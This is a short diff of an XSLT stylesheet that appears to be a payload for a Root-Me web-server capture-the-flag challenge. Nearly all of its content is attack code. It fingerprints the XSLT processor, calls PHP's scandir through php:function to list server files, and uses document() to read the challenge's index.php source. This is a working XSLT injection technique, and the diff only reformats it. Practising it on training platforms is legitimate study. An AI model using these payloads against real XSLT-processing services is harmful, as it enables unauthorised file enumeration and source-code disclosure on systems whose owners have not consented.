@@ -3,13 +3,11 @@
 <body style="font-family:Arial;font-size:12pt;color:red;background-color:#000000">
     <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
     <p>
-<br />Version: <xsl:value-of select="system-property('xsl:version')" />
-<br />Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
-<br />Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
-        <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
-	<xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/index.php')"/>
-	<xsl:value-of select="document('http://challenge01.root-me.org/web-serveur/ch50/index.php')"/>
-	    
+    	Version: <xsl:value-of select="system-property('xsl:version')" />
+    	Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
+    	Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
+    	Dir: <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
+    	File: <xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/index.php')"/>    
     </p>
 </body>
 </html> 
